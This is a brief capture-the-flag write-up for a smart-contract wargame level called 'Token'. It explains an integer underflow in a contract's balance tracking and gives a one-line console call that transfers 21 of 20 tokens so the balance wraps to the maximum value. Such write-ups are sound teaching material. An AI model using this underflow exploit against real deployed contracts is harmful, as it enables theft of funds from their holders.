# 5. Token

Goal :

- We are given 20 tokens to start with and to beat the level we somehow have to manage to get our hands on any additional tokens. Preferably a very large amount of tokens.

Methodology :

The contract doesn't check for overflows so we can easily manipulate the array that keeps of track of the balances.

````
// 20 - 21 = -1 
// our balance will then be equal to 115792089237316195423570985008687907853269984665640564039457584007913129639935
await contract.transfer("0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db", 21)
````

